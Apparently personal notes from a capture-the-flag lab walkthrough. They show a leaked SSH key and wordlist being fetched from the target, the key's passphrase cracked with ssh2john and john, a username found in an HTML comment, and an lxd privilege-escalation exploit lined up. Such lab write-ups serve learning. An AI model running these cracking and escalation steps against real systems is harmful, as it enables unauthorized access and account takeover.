got an ssh key: http://10.48.170.65/secret/secretKey

got a wordlist: http://10.48.170.65/uploads/dict.lst

key was encrypted john command used to crack the key

```console
┌──(kali㉿kali)-[/tmp]
└─$ ssh2john key >> hash
                                                                                                                    
┌──(kali㉿kali)-[/tmp]
└─$ wget http://10.48.170.65/uploads/dict.lst
--2026-05-31 10:52:36--  http://10.48.170.65/uploads/dict.lst
Connecting to 10.48.170.65:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2006 (2.0K)
Saving to: ‘dict.lst’

dict.lst                     100%[==============================================>]   1.96K  --.-KB/s    in 0s      

2026-05-31 10:52:37 (107 MB/s) - ‘dict.lst’ saved [2006/2006]

                                                                                                                    
┌──(kali㉿kali)-[/tmp]
└─$ john --wordlist=dict.lst hash                                 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (key)     
1g 0:00:00:00 DONE (2026-05-31 10:52) 20.00g/s 4440p/s 4440c/s 4440C/s 2003..starwars
Warning: passwords printed above might not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                    
┌──(kali㉿kali)-[/tmp]
└─$ 
```

password: letmein

---

now tried different usrers but no success went back to index.html and in below there was a comment

```
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

user: john, key got already, password: letmein

```
$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

we are part of lxd group after searching lxd priv esc on google i found: https://www.exploit-db.com/exploits/46978
